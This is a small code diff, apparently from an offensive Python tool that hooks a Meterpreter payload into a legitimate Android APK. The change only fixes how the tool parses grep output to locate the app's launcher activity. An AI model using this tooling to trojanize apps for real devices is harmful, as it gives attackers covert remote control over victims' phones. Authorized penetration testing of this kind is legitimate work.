@@ -164,7 +164,7 @@ def move_payload_files_to_normal_apk(VAR1):
 def hook_meterpreter_in_apk(VAR1, VAR2, VAR3):
     print(f"{YELLOW}\n[*] Trying to Find .smali File of Launcher")
     lineNumber = subprocess.check_output(f"grep -n -A 1 android.intent.action.MAIN {pwd}/normal_apk/AndroidManifest.xml | grep android.intent.category.LAUNCHER | cut -d- -f1", shell=True)
-    lineNumber = int(lineNumber) - 1
+    lineNumber = int(lineNumber.decode().split('\n')[0]) - 1
     i = 1
     launcherActivity = ""
     while i<lineNumber:
